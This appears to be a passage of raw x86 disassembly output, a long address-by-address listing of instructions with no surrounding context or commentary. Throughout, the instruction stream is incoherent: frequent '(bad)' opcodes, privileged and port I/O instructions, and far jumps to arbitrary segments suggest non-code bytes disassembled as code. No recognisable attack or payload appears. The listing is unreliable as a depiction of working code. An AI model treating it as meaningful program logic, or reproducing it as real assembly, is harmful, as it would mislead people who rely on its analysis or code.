  41b38f:	mov    bh,0xf8
  41b391:	adc    bh,BYTE PTR [ecx+0x12]
  41b394:	icebp  
  41b395:	(bad)  
  41b396:	mov    ebx,0x56631087
  41b39b:	jns    0x41b336
  41b39d:	push   edx
  41b39e:	push   ecx
  41b39f:	outs   dx,DWORD PTR ds:[esi]
  41b3a0:	push   es
  41b3a1:	stos   DWORD PTR es:[edi],eax
  41b3a2:	jg     0x41b327
  41b3a4:	call   0x1785:0x664e4669
  41b3ab:	out    0x8,eax
  41b3ad:	popa   
  41b3ae:	pop    ebx
  41b3af:	addr16 aas 
  41b3b1:	in     eax,dx
  41b3b2:	loopne 0x41b375
  41b3b4:	gs popa 
  41b3b6:	mov    ds:0x56019ce4,eax
  41b3bb:	shl    DWORD PTR [esi],1
  41b3bd:	and    bl,BYTE PTR [edx]
  41b3bf:	adc    al,0x67
  41b3c1:	or     al,0xc7
  41b3c3:	cmp    eax,0xd27cadf0
  41b3c8:	(bad)  
  41b3c9:	add    edi,edx
  41b3cb:	jg     0x41b37d
  41b3cd:	jmp    0xaabf:0xe6ccd84f
  41b3d4:	adc    al,0x34
  41b3d6:	dec    ch
  41b3d8:	pop    eax
  41b3d9:	inc    ebp
  41b3da:	xchg   esp,eax
  41b3db:	mov    BYTE PTR [edi-0x211f2df1],al
  41b3e1:	loopne 0x41b3cf
  41b3e3:	mov    eax,ds:0xb7b9b59e
  41b3e8:	jne    0x41b3a7
  41b3ea:	test   BYTE PTR [edx+0x36],bh
  41b3ed:	repz and eax,0xa190c4bd
  41b3f3:	(bad)  
  41b3f4:	sti    
  41b3f5:	stc    
  41b3f6:	ret    0x6daa
  41b3f9:	enter  0xeaf1,0x21
  41b3fd:	test   BYTE PTR [eax+0x744969ed],bl
  41b403:	ret    
  41b404:	xchg   ebx,eax
  41b405:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b406:	lods   eax,DWORD PTR ds:[esi]
  41b407:	dec    eax
  41b408:	jno    0x41b445
  41b40a:	xchg   ebp,eax
  41b40b:	push   edi
  41b40c:	pop    esi
  41b40d:	xchg   ecx,eax
  41b40e:	add    eax,0xbc6a7015
  41b413:	pop    eax
  41b414:	je     0x41b3f9
  41b416:	dec    ebp
  41b417:	ja     0x41b3ef
  41b419:	jne    0x41b3b6
  41b41b:	icebp  
  41b41c:	sub    BYTE PTR [eax-0x65b883cf],dl
  41b422:	fadd   DWORD PTR [esi-0x9]
  41b426:	in     al,dx
  41b427:	gs jg  0x41b3ee
  41b42a:	add    BYTE PTR [ecx+0x1f03c2fc],bl
  41b430:	into   
  41b431:	(bad)  
  41b432:	mov    BYTE PTR [edi],dh
  41b434:	inc    ecx
  41b435:	or     esp,edx
  41b437:	(bad)  
  41b438:	push   esp
  41b439:	mov    edi,ecx
  41b43b:	sub    BYTE PTR [edx+ebp*8],bl
  41b43e:	mov    DWORD PTR [ebp-0x34b0f062],ebp
  41b444:	fist   WORD PTR [esi+0x6284d24e]
  41b44a:	mov    edx,0xf73325d
  41b44f:	sub    BYTE PTR [ecx],ch
  41b451:	jle    0x41b4cc
  41b453:	mov    esp,0x6637d793
  41b458:	xor    BYTE PTR [esi],bh
  41b45a:	fcomp  QWORD PTR [ebx+0x794b39e4]
  41b460:	mov    eax,0x4b34740
  41b465:	pop    ds
  41b466:	xchg   esi,eax
  41b467:	dec    esi
  41b468:	adc    DWORD PTR [ebx],ebx
  41b46a:	xor    cl,BYTE PTR [esi]
  41b46c:	sti    
  41b46d:	(bad)
  41b470:	sahf   
  41b471:	out    dx,eax
  41b472:	add    eax,0x38553fb5
  41b477:	outs   dx,BYTE PTR ds:[esi]
  41b478:	sbb    DWORD PTR [ebp-0x45],edi
  41b47b:	inc    ebx
  41b47c:	inc    edx
  41b47d:	nop
  41b47e:	and    edi,DWORD PTR [esi*2-0x2eb69676]
  41b485:	sub    DWORD PTR [ebp-0x6f0216c1],esp
  41b48b:	nop
  41b48c:	rol    BYTE PTR [ebx],1
  41b48e:	lahf   
  41b48f:	jecxz  0x41b4a7
  41b491:	mov    dl,0x45
  41b493:	xchg   edx,edx
  41b495:	mov    WORD PTR [eax],?
  41b497:	pop    ecx
  41b498:	call   0x2b95:0xec983a30
  41b49f:	sub    DWORD PTR [edi],ebx
  41b4a1:	add    DWORD PTR [esi-0x18],esp
  41b4a4:	out    dx,al
  41b4a5:	or     BYTE PTR [edx],dl
  41b4a7:	jmp    FWORD PTR [edx+edx*4+0x18e34c3b]
  41b4ae:	rcr    DWORD PTR [ebx],1
  41b4b0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b4b1:	push   esi
  41b4b2:	test   eax,0x366b3c19
  41b4b7:	jg     0x41b488
  41b4b9:	mov    ds:0x50fc2b7c,eax
  41b4be:	jl     0x41b442
  41b4c0:	add    DWORD PTR [esi+0x5033588d],ecx
  41b4c6:	sar    DWORD PTR [edi+0x53],1
  41b4c9:	ret    
  41b4ca:	out    dx,al
  41b4cb:	xchg   ecx,eax
  41b4cc:	add    dh,bh
  41b4ce:	push   ebp
  41b4cf:	(bad)  
  41b4d0:	in     eax,0xd1
  41b4d2:	js     0x41b4a4
  41b4d4:	and    esp,esi
  41b4d6:	test   DWORD PTR [edi-0x18],eax
  41b4d9:	out    0xe2,al
  41b4db:	jno    0x41b481
  41b4dd:	push   ebp
  41b4de:	(bad)  
  41b4df:	fcomip st,st(3)
  41b4e1:	sbb    DWORD PTR [ebp-0x25cc7b85],eax
  41b4e7:	ror    edi,cl
  41b4e9:	jne    0x41b503
  41b4eb:	mov    bh,cl
  41b4ed:	addr16 in al,0xe9
  41b4f0:	mov    ch,BYTE PTR [ebx-0x3e]
  41b4f3:	mov    fs,WORD PTR [edi+0x6cfc430c]
  41b4f9:	scas   al,BYTE PTR es:[edi]
  41b4fa:	fptan  
  41b4fc:	sub    BYTE PTR [eax+ecx*8],cl
  41b4ff:	ds add al,bh
  41b502:	or     ch,BYTE PTR [ebp+0x3e623da2]
  41b508:	das    
  41b509:	jns    0x41b4e5
  41b50b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b50c:	int3   
  41b50d:	mov    es,WORD PTR [ecx]
  41b50f:	addr16 push ss
  41b511:	add    BYTE PTR [edi+0x2a],bh
  41b514:	aas    
  41b515:	js     0x41b499
  41b517:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b518:	in     eax,dx
  41b519:	rol    eax,1
  41b51b:	xor    cl,BYTE PTR [eax+0x426f44cb]
  41b521:	xlat   BYTE PTR ds:[ebx]
  41b522:	outs   dx,DWORD PTR cs:[esi]
  41b524:	ins    DWORD PTR es:[edi],dx
  41b525:	mov    esi,eax
  41b527:	and    ebx,DWORD PTR [ecx]
  41b529:	add    ah,BYTE PTR [edx]
  41b52b:	and    ecx,DWORD PTR [ecx+0x760f62be]
  41b531:	dec    eax
  41b532:	jmp    0xc4a8:0xe52b4789
  41b539:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b53a:	sub    DWORD PTR [edi+0x62f71dcb],eax
  41b540:	inc    ebp
  41b541:	int3   
  41b542:	sahf   
  41b543:	shr    DWORD PTR [eax+0x42],0x7c
  41b547:	pop    edx
  41b548:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b549:	add    dh,BYTE PTR [eax]
  41b54b:	adc    BYTE PTR ds:0x63e0cc46,ah
  41b551:	xor    edx,DWORD PTR [esi]
  41b553:	pop    ss
  41b554:	pop    ds
  41b555:	into   
  41b556:	xor    al,0xb3
  41b558:	mov    ebp,0xcb92cb83
  41b55d:	clc    
  41b55e:	mov    ah,0xbc
  41b560:	and    bh,BYTE PTR [ebp-0x2c]
  41b563:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b564:	loop   0x41b5b5
  41b566:	mov    ds:0x3b0635ce,al
  41b56b:	btc    DWORD PTR [edx-0x63],ebx
  41b56f:	mov    edi,0x94509bfd
  41b574:	add    eax,0xb6edd8e
  41b579:	mov    al,ds:0xdec4e575
  41b57e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b57f:	hlt    
  41b580:	data16 fidiv WORD PTR [eax+0x1b]
  41b584:	inc    DWORD PTR [esi]
  41b586:	or     bh,cl
  41b588:	mov    ecx,0x8a28d921
  41b58d:	mov    edi,edx
  41b58f:	inc    edi
  41b590:	adc    al,0x8f
  41b592:	jno    0x41b55a
  41b594:	mov    dh,0x94
  41b596:	jnp    0x41b544
  41b598:	sbb    dl,cl
  41b59a:	lds    ebx,FWORD PTR [ecx+0x35da48b]
  41b5a0:	addr16 in al,0xe1
  41b5a3:	xchg   edx,eax
  41b5a4:	(bad)  
  41b5a5:	mov    es,WORD PTR [esp+eax*8]
  41b5a8:	je     0x41b5ae
  41b5aa:	dec    edx
  41b5ab:	mov    dh,0x8d
  41b5ad:	das    
  41b5ae:	jbe    0x41b592
  41b5b0:	ins    BYTE PTR es:[edi],dx
  41b5b1:	std    
  41b5b2:	stc    
  41b5b3:	mov    ecx,0xedef2f5d
  41b5b8:	and    BYTE PTR [ecx],al
  41b5ba:	inc    edi
  41b5bb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b5bc:	mov    ebp,0xf87b6240
  41b5c1:	pop    eax
  41b5c2:	stc    
  41b5c3:	add    ebx,DWORD PTR cs:[edi-0x2a3dfde]
  41b5ca:	add    dh,0x6d
  41b5cd:	mov    DWORD PTR [ebx+0x5961ef99],edi
  41b5d3:	cwde   
  41b5d4:	repnz cmp eax,0x54ee9fb0
  41b5da:	das    
  41b5db:	adc    BYTE PTR [edi-0x3d],cl
  41b5de:	push   esp
  41b5df:	mov    dh,0xa3
  41b5e1:	sbb    BYTE PTR [esp+ebx*4],bl
  41b5e4:	jmp    0xcf4d:0xdd32f45d
  41b5eb:	mov    bl,0x4c
  41b5ed:	scas   eax,DWORD PTR es:[edi]
  41b5ee:	mov    ch,0x7c
  41b5f0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b5f1:	fisubr DWORD PTR [esi]
  41b5f3:	sbb    cl,BYTE PTR [edx]
  41b5f5:	push   esi
  41b5f6:	scas   eax,DWORD PTR es:[edi]
  41b5f7:	stos   BYTE PTR es:[edi],al
  41b5f8:	mov    ch,BYTE PTR [ebx-0x721b7af0]
  41b5fe:	sti    
  41b5ff:	inc    esp
  41b600:	push   ebx
  41b601:	dec    edi
  41b602:	sub    eax,0x73426e2f
  41b607:	xchg   al,cl
  41b609:	clc    
  41b60a:	nop
  41b60b:	retf   
  41b60c:	inc    ecx
  41b60d:	scas   al,BYTE PTR es:[edi]
  41b60e:	shl    BYTE PTR [ecx],0xf
  41b611:	jecxz  0x41b618
  41b613:	arpl   WORD PTR [ecx-0x7b],cx
  41b616:	add    al,0xcc
  41b618:	dec    edx
  41b619:	(bad)  
  41b61a:	dec    DWORD PTR [eax+0x58]
  41b61d:	and    BYTE PTR [ecx+0x5c],al
  41b620:	test   cl,dh
  41b622:	push   esp
  41b623:	aad    0x33
  41b625:	mov    dl,0x17
  41b627:	push   ds
  41b628:	inc    esi
  41b629:	sbb    eax,0x2c
  41b62c:	pop    ebx
  41b62d:	cmp    BYTE PTR [eax-0x7],0x93
  41b631:	int3   
  41b632:	out    dx,eax
  41b633:	fcomip st,st(1)
  41b635:	mov    gs,ebp
  41b637:	jg     0x41b6ae
  41b639:	scas   al,BYTE PTR es:[edi]
  41b63a:	mov    bl,0xac
  41b63c:	call   0x257d7708
  41b641:	mov    ch,0xfb
  41b643:	aam    0x53
  41b645:	das    
  41b646:	push   ds
  41b647:	pusha  
  41b648:	jp     0x41b617
  41b64a:	popf   
  41b64b:	stos   DWORD PTR es:[edi],eax
  41b64c:	pop    eax
  41b64d:	dec    edi
  41b64e:	push   ds
  41b64f:	(bad)  
  41b650:	push   ss
  41b651:	sbb    BYTE PTR fs:[eax-0x3],0xc9
  41b656:	xchg   esi,eax
  41b657:	cli    
  41b658:	rcr    bh,0x87
  41b65b:	fs dec edi
  41b65d:	xchg   esp,esi
  41b65f:	test   al,0x98
  41b661:	fidivr WORD PTR [esi-0x69057592]
  41b667:	xor    eax,DWORD PTR [eax+ecx*2-0x79]
  41b66b:	xchg   ebx,eax
  41b66c:	add    al,0x9
  41b66e:	stos   BYTE PTR es:[edi],al
  41b66f:	rcl    dh,0x46
  41b672:	push   edx
  41b673:	dec    ecx
  41b674:	fnstcw WORD PTR [ebp-0x49]
  41b677:	mov    al,ds:0xa22fd7c6
  41b67c:	and    al,0x52
  41b67e:	sub    DWORD PTR [ebx+0x43],0xffffffb1
  41b682:	cmp    eax,0x292abb10
  41b687:	fcmove st,st(0)
  41b689:	or     al,0xc6
  41b68b:	fmul   QWORD PTR [ecx]
  41b68d:	and    ecx,DWORD PTR [esi+0x78]
  41b690:	cmp    al,0x29
  41b692:	cmp    BYTE PTR [esi-0x7c85b3d8],ch
  41b698:	hlt    
  41b699:	inc    esp
  41b69a:	mov    eax,ds:0xfe54d97f
  41b69f:	jb     0x41b682
  41b6a1:	pop    ebx
  41b6a2:	xchg   ebp,eax
  41b6a3:	fwait
  41b6a4:	push   0x8e32a474
  41b6a9:	mov    ch,0x4f
  41b6ab:	dec    esi
  41b6ac:	retf   0xfcf5
  41b6af:	iret   
  41b6b0:	fucomi st,st(7)
  41b6b2:	mov    ds:0x76815a4c,al
  41b6b7:	jne    0x41b70c
  41b6b9:	call   0x2eac7e3d
  41b6be:	aad    0xa4
  41b6c0:	shl    BYTE PTR [eax+0x3b],0xe4
  41b6c4:	pop    ecx
  41b6c5:	or     ch,cl
  41b6c7:	cmp    edi,DWORD PTR [ecx+0x7f6d2403]
  41b6cd:	mov    edx,0x673ab140
  41b6d2:	aaa    
  41b6d3:	cwde   
  41b6d4:	xchg   edx,eax
  41b6d5:	out    0x1a,al
  41b6d7:	add    esp,ecx
  41b6d9:	add    dl,0x9d
  41b6dc:	dec    edi
  41b6dd:	jp     0x41b69f
  41b6df:	pop    edi
  41b6e0:	ss popa 
  41b6e2:	pop    es
  41b6e3:	push   ebx
  41b6e4:	fmulp  st(1),st
  41b6e6:	pop    eax
  41b6e7:	cmp    bl,dh
  41b6e9:	add    dl,bh
  41b6eb:	adc    ah,bh
  41b6ed:	lahf   
  41b6ee:	jnp    0x41b6a3
  41b6f0:	mov    ?,WORD PTR [ecx]
  41b6f2:	cmp    DWORD PTR cs:[esi-0x6b717236],esp
  41b6f9:	mov    ah,0xe4
  41b6fb:	fisubr WORD PTR [edx+eiz*8-0x21]
  41b6ff:	in     al,0x9d
  41b701:	loop   0x41b72e
  41b703:	xchg   edi,eax
  41b704:	or     BYTE PTR [ebx-0x6b6891dd],bl
  41b70a:	enter  0x8987,0xd9
  41b70e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b70f:	lds    ebx,FWORD PTR [eax+0x30]
  41b712:	add    DWORD PTR fs:[edi-0x4d0a9b24],esi
  41b719:	cwde   
  41b71a:	imul   al
  41b71c:	aas    
  41b71d:	jb     0x41b760
  41b71f:	retf   0xc2a2
  41b722:	dec    ebx
  41b723:	pusha  
  41b724:	xlat   BYTE PTR ds:[ebx]
  41b725:	pop    ss
  41b726:	cmp    DWORD PTR [ebp-0x6a040ad1],esi
  41b72c:	scas   eax,DWORD PTR es:[edi]
  41b72d:	lods   eax,DWORD PTR ds:[esi]
  41b72e:	fidiv  WORD PTR [eax-0x6d]
  41b731:	add    BYTE PTR [ebp+0xc],bl
  41b734:	mov    edi,0xa67155d9
  41b739:	into   
  41b73a:	out    0x5b,al
  41b73c:	adc    DWORD PTR [esi],edi
  41b73e:	sti    
  41b73f:	fs inc esi
  41b741:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b743:	cld    
  41b744:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b745:	mov    eax,ds:0x58da771e
  41b74a:	inc    eax
  41b74b:	dec    edx
  41b74c:	jp     0x41b788
  41b74e:	imul   esp,DWORD PTR [edx],0xb
  41b751:	icebp  
  41b752:	pop    ecx
  41b753:	adc    bl,cl
  41b755:	fdivr  st(4),st
  41b757:	cmc    
  41b758:	xor    al,0xd0
  41b75a:	pop    esp
  41b75b:	sbb    DWORD PTR [esi+0x3b124cc7],eax
  41b761:	stos   BYTE PTR es:[edi],al
  41b762:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b763:	cmp    DWORD PTR [ecx+0xc],ecx
  41b766:	push   ecx
  41b767:	int    0x8
  41b769:	pop    ebx
  41b76a:	js     0x41b7d0
  41b76c:	jmp    0xce4e4ec5
  41b771:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b772:	into   
  41b773:	mov    WORD PTR [ebx],ss
  41b775:	mov    ecx,0xed370a4c
  41b77a:	popf   
  41b77b:	and    eax,0xb5656232
  41b780:	inc    ecx
  41b781:	adc    al,0x5e
  41b783:	arpl   WORD PTR [eax+0x7633747a],cx
  41b789:	ds cmp bl,0x57
  41b78d:	fmul   st(3),st
  41b78f:	repz pop edx
  41b791:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b792:	jmp    0x107280ee
  41b797:	stos   BYTE PTR es:[edi],al
  41b798:	adc    eax,0x52e71de0
  41b79d:	cmp    DWORD PTR [ecx+0x120d0679],ecx
  41b7a3:	outs   dx,BYTE PTR ds:[esi]
  41b7a4:	jns    0x41b7be
  41b7a6:	out    0x51,al
  41b7a8:	je     0x41b73b
  41b7aa:	lahf   
  41b7ab:	arpl   WORD PTR [edi],si
  41b7ad:	or     al,BYTE PTR [esi]
  41b7af:	push   esp
  41b7b0:	sub    esp,DWORD PTR [esi+0x2cd40b17]
  41b7b6:	jb     0x41b799
  41b7b8:	cmp    BYTE PTR [ecx+0x36],dh
  41b7bb:	mov    eax,0xa2ff4f84
  41b7c0:	push   ebp
  41b7c1:	mov    eax,0xaba38a7d
  41b7c6:	cmp    al,0x6c
  41b7c8:	mov    eax,ds:0xfe3289bf
  41b7cd:	aaa    
  41b7ce:	inc    ebp
  41b7cf:	mov    eax,ds:0xe3c4d6c8
  41b7d4:	jbe    0x41b7e1
  41b7d6:	in     eax,0x7f
  41b7d8:	push   0xf33e3aa7
  41b7dd:	lds    edi,FWORD PTR [ebx+0x41b2c4b1]
  41b7e3:	fst    QWORD PTR [eax-0x18a8d254]
  41b7e9:	ret    0x5b65
  41b7ec:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b7ed:	jmp    0x8a73:0x82a91407
  41b7f4:	ja     0x41b842
  41b7f6:	mov    bl,BYTE PTR [esi+0x51]
  41b7f9:	hlt    
  41b7fa:	mov    ah,0x31
  41b7fc:	xor    ebx,DWORD PTR [ebx+eiz*1-0x45d0f637]
  41b803:	xor    ebp,ebp
  41b805:	fs dec esi
  41b807:	pop    esi
  41b808:	call   0x5bce:0x8e4f68f1
  41b80f:	xor    edi,DWORD PTR [ebp+0x2409d7ea]
  41b815:	mov    ebp,0xde91c9be
  41b81a:	xor    cl,dl
  41b81c:	adc    al,0x80
  41b81e:	cmp    al,0xb9
  41b820:	cmp    eax,0x89e7acd7
  41b825:	out    dx,eax
  41b826:	add    BYTE PTR [edi-0x36],0x1e
  41b82a:	xor    esp,ebx
  41b82c:	in     eax,dx
  41b82d:	xor    esp,eax
  41b82f:	lock (bad) 
  41b831:	push   ss
  41b832:	pop    eax
  41b833:	push   esp
  41b834:	cmc    
  41b835:	dec    edx
  41b836:	les    ecx,FWORD PTR [edx+0x3204bf42]
  41b83c:	loope  0x41b822
  41b83e:	imul   esi,DWORD PTR [ebx],0x5a
  41b841:	jmp    0x337:0x6a5daf99
  41b848:	mov    bl,ch
  41b84a:	ins    BYTE PTR es:[edi],dx
  41b84b:	pop    esp
  41b84c:	jbe    0x41b814
  41b84e:	retf   
  41b84f:	or     ebp,ebp
  41b851:	cmp    BYTE PTR [ebx],0x1d
  41b854:	xchg   ecx,eax
  41b855:	clc    
  41b856:	mov    ds:0xcf807ff9,eax
  41b85b:	and    eax,0x4cccaf1a
  41b860:	dec    edx
  41b861:	xchg   ebp,eax
  41b862:	(bad)  
  41b863:	icebp  
  41b864:	and    DWORD PTR ds:0xe1b2aa56,ebx
  41b86a:	ss push edi
  41b86c:	push   esp
  41b86d:	sbb    ecx,DWORD PTR [ebp+0x48ddad61]
  41b873:	dec    ecx
  41b874:	add    eax,0x72a74c08
  41b879:	pusha  
  41b87a:	push   0x9a054af0
  41b87f:	ret    
  41b880:	jecxz  0x41b82f
  41b882:	dec    ebp
  41b883:	jmp    0x6005:0x92476888
  41b88a:	icebp  
  41b88b:	mov    ds:0x1834c6ed,eax
  41b890:	jo     0x41b8a0
  41b892:	pop    ecx
  41b893:	stos   BYTE PTR es:[edi],al
  41b894:	ret    0xe17a
  41b897:	mov    edi,0xc3493a43
  41b89c:	inc    eax
  41b89d:	xor    al,0x5b
  41b89f:	adc    BYTE PTR [edx+0x43129067],ah
  41b8a5:	test   al,0x8e
  41b8a7:	inc    esp
  41b8a8:	pop    edi
  41b8a9:	or     eax,edx
  41b8ab:	imul   ebp,esp,0x57f3b728
  41b8b1:	sbb    eax,0xf58a6a55
  41b8b6:	gs dec ebx
  41b8b8:	adc    ecx,0x31
  41b8bb:	pop    ebp
  41b8bc:	prefetch BYTE PTR [edi-0x71a17c40]
  41b8c3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b8c4:	xchg   edx,eax
  41b8c5:	lea    esi,[ecx+0x46d3911e]
  41b8cb:	or     eax,0x428ac329
  41b8d0:	push   esi
  41b8d1:	pop    eax
  41b8d2:	xor    al,0xc2
  41b8d4:	dec    esi
  41b8d5:	int3   
  41b8d6:	fistp  WORD PTR [eax]
  41b8d8:	or     bl,BYTE PTR [ebp-0x6d9a2573]
  41b8de:	in     al,dx
  41b8df:	push   eax
  41b8e0:	outs   dx,BYTE PTR ds:[esi]
  41b8e1:	mov    eax,ds:0x39f6fe53
  41b8e6:	mov    bh,dl
  41b8e8:	sbb    al,0xec
  41b8ea:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b8eb:	hlt    
  41b8ec:	add    ch,BYTE PTR [edx+0x27920b00]
  41b8f2:	push   ebx
  41b8f3:	mov    DWORD PTR [edx-0x50d8fdf6],edi
  41b8f9:	in     eax,dx
  41b8fa:	rcr    al,0xda
  41b8fd:	cmp    eax,0xfb509d35
  41b902:	mov    dh,0xa0
  41b904:	stc    
  41b905:	test   dl,ch
  41b907:	adc    esi,ebp
  41b909:	adc    DWORD PTR [esi+0x280e61af],0x6085c060
  41b913:	scas   eax,DWORD PTR es:[edi]
  41b914:	cmp    eax,DWORD PTR [esi+0x68]
  41b917:	push   ds
  41b918:	popa   
  41b919:	mov    cl,0x6e
  41b91b:	int    0xc1
  41b91d:	dec    edx
  41b91e:	push   DWORD PTR [ebp+0x8]
  41b921:	aam    0x33
  41b923:	out    dx,eax
  41b924:	popa   
  41b925:	rcl    DWORD PTR ds:0x91880212,cl
  41b92b:	jge    0x41b8f4
  41b92d:	mov    DWORD PTR [edi-0x7f5dda19],edi
  41b933:	jmp    0x6a6c:0x4f83050c
  41b93a:	and    DWORD PTR [esi+ecx*2-0x49],0x9e8147c9
  41b942:	push   edx
  41b943:	fwait
  41b944:	mov    eax,fs
  41b946:	fstp   st(1)
  41b948:	and    DWORD PTR [eax+ecx*1],ebx
  41b94b:	pop    esi
  41b94d:	(bad)  
  41b94e:	push   ebx
  41b94f:	inc    ebx
  41b950:	inc    ecx
  41b951:	fsubp  st(3),st
  41b953:	sbb    bl,BYTE PTR [ebx+0x1b]
  41b956:	push   ebx
  41b957:	fwait
  41b958:	out    dx,al
  41b959:	mov    ecx,0x251f7344
  41b95e:	dec    ebp
  41b95f:	inc    BYTE PTR [ebx+0x6b44e535]
  41b965:	or     al,0xe6
  41b967:	xor    esp,DWORD PTR [esi-0xa]
  41b96a:	xchg   ecx,eax
  41b96b:	mov    eax,0x4fa443c
  41b970:	ret    
  41b971:	mov    dh,0xc2
  41b973:	stos   DWORD PTR es:[edi],eax
  41b974:	mov    ch,ch
  41b976:	xor    al,0x5
  41b978:	push   0x43e146fc
  41b97d:	mov    dh,0x65
  41b97f:	xchg   ebp,eax
  41b980:	stos   DWORD PTR es:[edi],eax
  41b981:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b982:	lea    ecx,[ebx-0x22]
  41b985:	cmp    eax,0xc795768a
  41b98a:	ret    0xd151
  41b98d:	sbb    cl,bh
  41b98f:	or     BYTE PTR [ebx],0x65
  41b992:	enter  0x816a,0xba
  41b996:	inc    esp
  41b997:	aaa    
  41b998:	mov    cl,0x4b
  41b99a:	ror    al,0x6b
  41b99d:	lahf   
  41b99e:	mov    esp,0x53a87118
  41b9a3:	mov    edx,0xf7b6689c
  41b9a8:	in     al,0x6b
  41b9aa:	add    ch,BYTE PTR [edi+0x7845c27e]
  41b9b0:	pop    esi
  41b9b1:	fisttp DWORD PTR [eax+0x6a6c2d4c]
  41b9b7:	es into 
  41b9b9:	and    eax,0x9b370f3c
  41b9be:	and    ebx,DWORD PTR [ebp-0x1624e3a0]
  41b9c4:	mov    esp,DWORD PTR [ebp-0xa]
  41b9c7:	push   esp
  41b9c8:	test   DWORD PTR [eax-0xf],ebx
  41b9cb:	cmp    BYTE PTR [ebx+0x48],dh
  41b9ce:	inc    esp
  41b9cf:	int3   
  41b9d0:	mov    esi,0x9b0de212
  41b9d5:	popf   
  41b9d6:	leave  
  41b9d7:	daa    
  41b9d8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b9d9:	leave  
  41b9da:	dec    ebx
  41b9db:	push   0xabf6c150
  41b9e0:	push   esi
  41b9e1:	stc    
  41b9e2:	mov    ah,0xd7
  41b9e4:	cmp    BYTE PTR [ebx],bh
  41b9e6:	inc    esp
  41b9e7:	and    bh,al
  41b9e9:	nop
  41b9ea:	xchg   ebp,eax
  41b9eb:	mov    ah,0x7
  41b9ed:	and    BYTE PTR [ebp-0x7a80da3f],bl
  41b9f3:	push   0x67
  41b9f5:	aad    0xd7
  41b9f7:	pop    eax
  41b9f8:	movzx  eax,WORD PTR [ebx]
  41b9fb:	cmp    edi,DWORD PTR [esi+0x22]
  41b9fe:	bound  eax,QWORD PTR [ecx-0x24]
  41ba01:	loopne 0x41ba1b
  41ba03:	ror    BYTE PTR [esi+0x44],cl
  41ba06:	out    dx,al
  41ba07:	aam    0x3
  41ba09:	iret   
  41ba0a:	stos   BYTE PTR es:[edi],al
  41ba0b:	pop    ecx
  41ba0c:	loopne 0x41ba71
  41ba0e:	inc    ebp
  41ba0f:	inc    ebx
  41ba10:	(bad)  
  41ba11:	cmc    
  41ba12:	test   al,0xd1
  41ba14:	imul   esp,esi,0xffffffb6
  41ba17:	std    
  41ba18:	test   ecx,ebx
  41ba1a:	fwait
  41ba1b:	into   
  41ba1c:	add    ebx,esi
  41ba1e:	mov    al,ds:0xb08ed734
  41ba23:	mov    ebx,0x397eab34
  41ba28:	shl    BYTE PTR [edi+0x738e3937],1
  41ba2e:	(bad)  
  41ba2f:	jl     0x41ba86
  41ba31:	outs   dx,DWORD PTR ds:[esi]
  41ba32:	into   
  41ba33:	or     BYTE PTR ss:[edi],al
  41ba36:	xchg   edx,eax
  41ba37:	mov    edx,0xf02c0841
  41ba3c:	xor    DWORD PTR [edi+0x723a778f],ecx
  41ba42:	(bad)  
  41ba43:	or     eax,0x1a2d1175
  41ba48:	xchg   ebp,eax
  41ba49:	fwait
  41ba4a:	xchg   edi,eax
  41ba4b:	and    eax,0x8a6f0d0
  41ba50:	jns    0x41ba74
  41ba52:	je     0x41ba2b
  41ba54:	in     al,0x84
  41ba56:	and    DWORD PTR [edi+0x3],ebp
  41ba59:	adc    bh,BYTE PTR [ebp+0x33d0f48e]
  41ba5f:	jb     0x41ba7b
  41ba61:	inc    eax
  41ba62:	jp     0x41ba86
  41ba64:	sbb    DWORD PTR [ebp+eax*8-0x77],ebp
  41ba68:	hlt    
  41ba69:	jl     0x41ba79
  41ba6b:	xchg   esp,eax
  41ba6c:	add    al,0x4c
  41ba6e:	jo     0x41ba65
  41ba70:	dec    eax
  41ba71:	push   ebx
  41ba72:	xor    eax,0x305b96c5
  41ba77:	adc    bl,BYTE PTR [edi+edi*2]
  41ba7a:	mov    ecx,0xcb016e06
  41ba7f:	mov    edi,0xf6bf31c3
  41ba84:	lock repz mov esp,0xb6b40d08
  41ba8b:	or     dl,BYTE PTR [ebp+edi*8+0x32b31141]
  41ba92:	aas    
  41ba93:	mov    BYTE PTR [ecx+0x75ba4eba],al
  41ba99:	jmp    0x2d91:0xc742be9e
  41baa0:	rcl    BYTE PTR [ecx],0x98
  41baa3:	js     0x41ba7b
  41baa5:	push   edi
  41baa6:	adc    eax,0x7f0767f6
  41baab:	xchg   esp,eax
  41baac:	dec    edi
  41baad:	cs mov esi,0xaabb1921
  41bab3:	(bad)  
  41bab4:	in     eax,dx
  41bab5:	or     eax,DWORD PTR [edx-0x69bebf3c]
  41babb:	mov    ss:0x2b5db556,al
  41bac1:	out    0xd5,eax
  41bac3:	out    dx,eax
  41bac4:	xchg   edx,eax
  41bac5:	push   ss
  41bac6:	add    eax,0xc022a22
  41bacb:	arpl   WORD PTR [eax+0x45],di
  41bace:	jo     0x41bab6
  41bad0:	cmp    edi,DWORD PTR [ebx+0xd]
  41bad3:	test   eax,0x88acf966
  41bad8:	fadd   DWORD PTR [edi+esi*2+0x72]
  41badc:	jmp    0x41ba7d
  41bade:	mov    edx,0x629cdf3d
  41bae3:	loope  0x41ba94
  41bae5:	aas    
  41bae6:	sub    BYTE PTR [edi],ah
  41bae8:	hlt    
  41bae9:	inc    eax
